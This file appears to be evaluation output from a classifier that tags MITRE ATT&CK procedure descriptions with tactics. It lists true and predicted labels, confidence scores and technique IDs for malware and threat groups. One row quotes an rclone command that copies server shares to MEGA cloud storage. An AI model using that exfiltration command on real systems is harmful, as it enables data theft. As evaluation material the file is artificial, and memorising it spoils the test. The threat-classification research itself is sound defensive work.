text,true_labels,predicted_labels,max_confidence,source_name,technique_id,technique_name
"[Embargo](https://attack.mitre.org/software/S1247) has modified and deleted Registry keys to add services, and to disable Security Solutions such as Windows Defender.(Citation: ESET Embargo Ransomware October 2024)",defense-impairment|persistence,defense-impairment|impact|persistence,0.9999724370554209,Embargo,T1112,Modify Registry
"[Pupy](https://attack.mitre.org/software/S0192) can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.(Citation: GitHub Pupy)",exfiltration,collection|exfiltration,0.9999611511222531,Pupy,T1041,Exfiltration Over C2 Channel
[Qilin](https://attack.mitre.org/software/S1242) has been delivered to victims through spearphishing emails with malicious attachments.(Citation: SentinelOne Qilin NOV 2022),execution,initial-access,0.9999392920968985,Qilin,T1204.002,Malicious File
[APT19](https://attack.mitre.org/groups/G0073) configured its payload to inject into the rundll32.exe.(Citation: FireEye APT19),stealth,privilege-escalation|stealth,0.9998525825612555,APT19,T1218.011,Rundll32
[Akira](https://attack.mitre.org/groups/G1024) uses compromised VPN accounts for initial access to victim networks.(Citation: Secureworks GOLD SAHARA),initial-access|persistence,initial-access|persistence|privilege-escalation|resource-development|stealth,0.9997376138039061,Akira,T1133,External Remote Services
[DarkTortilla](https://attack.mitre.org/software/S1066) has modified registry keys for persistence.(Citation: Secureworks DarkTortilla Aug 2022),defense-impairment|persistence,defense-impairment|persistence|privilege-escalation,0.9997260817439693,DarkTortilla,T1112,Modify Registry
[Crutch](https://attack.mitre.org/software/S0538) can exfiltrate data over the primary C2 channel (Dropbox HTTP API).(Citation: ESET Crutch December 2020),exfiltration,command-and-control|exfiltration,0.9996667720378928,Crutch,T1041,Exfiltration Over C2 Channel
[FIN13](https://attack.mitre.org/groups/G1016) has leveraged SMB to move laterally within a compromised network via application servers and SQL servers.(Citation: Sygnia Elephant Beetle Jan 2022),lateral-movement,initial-access|lateral-movement,0.9995235753873613,FIN13,T1021.002,SMB/Windows Admin Shares
[Kazuar](https://attack.mitre.org/software/S0265) stages command output and collected data in files before exfiltration.(Citation: Unit 42 Kazuar May 2017),collection,collection|exfiltration,0.99952011310694,Kazuar,T1074.001,Local Data Staging
[Lizar](https://attack.mitre.org/software/S0681) has used the Reflective DLL injection module from Github to inject itself into a process’s memory.(Citation: SekoiaBourhis_DiceLoader_Feb2024),stealth,privilege-escalation|stealth,0.9995057480176934,Lizar,T1620,Reflective Code Loading
Lateral movement can be done with [Net](https://attack.mitre.org/software/S0039) through net use commands to connect to the on remote systems.(Citation: Savill 1999),lateral-movement,command-and-control|lateral-movement,0.9994726795178138,Net,T1021.002,SMB/Windows Admin Shares
[LockBit 2.0](https://attack.mitre.org/software/S1199) can create Registry keys to bypass UAC and for persistence.(Citation: FBI Lockbit 2.0 FEB 2022),defense-impairment|persistence,defense-impairment|persistence|privilege-escalation,0.9993704750283354,LockBit 2.0,T1112,Modify Registry
[Lokibot](https://attack.mitre.org/software/S0447) has used PowerShell commands embedded inside batch scripts.(Citation: Talos Lokibot Jan 2021),execution,execution|stealth,0.9992353538203551,Lokibot,T1059.001,PowerShell
[KGH_SPY](https://attack.mitre.org/software/S0526) can exfiltrate collected information from the host to the C2 server.(Citation: Cybereason Kimsuky November 2020),exfiltration,collection|exfiltration,0.9992306515739154,KGH_SPY,T1041,Exfiltration Over C2 Channel
[LAPSUS$](https://attack.mitre.org/groups/G1004) has accessed local password managers and databases to obtain further credentials from a compromised network.(Citation: NCC Group LAPSUS Apr 2022),credential-access,collection|credential-access,0.9992095329728639,LAPSUS$,T1555.005,Password Managers
[FIN6](https://attack.mitre.org/groups/G0037) has extracted password hashes from ntds.dit to crack offline.(Citation: FireEye FIN6 April 2016),credential-access,collection|credential-access,0.9991234435806509,FIN6,T1110.002,Password Cracking
[APT38](https://attack.mitre.org/groups/G0082) has used web shells for persistence or to ensure redundant access.(Citation: CISA AA20-239A BeagleBoyz August 2020),persistence,persistence|privilege-escalation,0.9990962052702113,APT38,T1505.003,Web Shell
[RogueRobin](https://attack.mitre.org/software/S0270) created a shortcut in the Windows startup folder to launch a PowerShell script each time the user logs in to establish persistence.(Citation: Unit 42 DarkHydrus July 2018),persistence|privilege-escalation,execution|persistence|privilege-escalation,0.999024552220821,RogueRobin,T1547.001,Registry Run Keys / Startup Folder
[FIN13](https://attack.mitre.org/groups/G1016) has remotely accessed compromised environments via Remote Desktop Services (RDS) for lateral movement.(Citation: Mandiant FIN13 Aug 2022),lateral-movement,initial-access|lateral-movement|persistence,0.9989439954671975,FIN13,T1021.001,Remote Desktop Protocol
"[SMOKEDHAM](https://attack.mitre.org/software/S0649) has modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP.(Citation: FireEye SMOKEDHAM June 2021)",defense-impairment|persistence,credential-access|defense-impairment|persistence|privilege-escalation,0.9989394785303166,SMOKEDHAM,T1112,Modify Registry
"During [C0015](https://attack.mitre.org/campaigns/C0015), the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the [Rclone](https://attack.mitre.org/software/S1040) command `rclone.exe copy --max-age 2y ""\\SERVER\Shares"" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M`.(Citation: DFIR Conti Bazar Nov 2021)",exfiltration,collection|exfiltration,0.9988891719948396,C0015,T1567.002,Exfiltration to Cloud Storage
[Indrik Spider](https://attack.mitre.org/groups/G0119) has used valid accounts for initial access and lateral movement.(Citation: Mandiant_UNC2165) [Indrik Spider](https://attack.mitre.org/groups/G0119) has also maintained access to the victim environment through the VPN infrastructure.(Citation: Mandiant_UNC2165),initial-access|persistence|privilege-escalation|stealth,initial-access|lateral-movement|persistence|privilege-escalation|stealth,0.998869206358594,Indrik Spider,T1078,Valid Accounts
"[StrelaStealer](https://attack.mitre.org/software/S1183) has sideloaded a DLL payload using a renamed, legitimate `msinfo32.exe` executable.(Citation: DCSO StrelaStealer 2022)",execution|stealth,stealth,0.9988645173976407,StrelaStealer,T1574.001,DLL
[KOPILUWAK](https://attack.mitre.org/software/S1075) has used HTTP POST requests to send data to C2.(Citation: Mandiant Suspected Turla Campaign February 2023),command-and-control,command-and-control|exfiltration,0.9987677798945529,KOPILUWAK,T1071.001,Web Protocols
[ShimRat](https://attack.mitre.org/software/S0444) has installed a Windows service to maintain persistence on victim machines.(Citation: FOX-IT May 2016 Mofang),persistence|privilege-escalation,execution|persistence|privilege-escalation,0.9986693945047895,ShimRat,T1543.003,Windows Service
[Hi-Zor](https://attack.mitre.org/software/S0087) has the ability to upload and download files from its C2 server.(Citation: Fidelis INOCNATION),command-and-control,command-and-control|exfiltration,0.9986600812520043,Hi-Zor,T1105,Ingress Tool Transfer
[TrickBot](https://attack.mitre.org/software/S0266) used COM to setup scheduled task for persistence.(Citation: ESET Trickbot Oct 2020),execution,execution|persistence|privilege-escalation,0.9986260926947924,TrickBot,T1559.001,Component Object Model
[NPPSPY](https://attack.mitre.org/software/S1131) records data entered from the local system logon at Winlogon to capture credentials in cleartext.(Citation: Huntress NPPSPY 2022),collection,collection|credential-access,0.9985515080044117,NPPSPY,T1005,Data from Local System
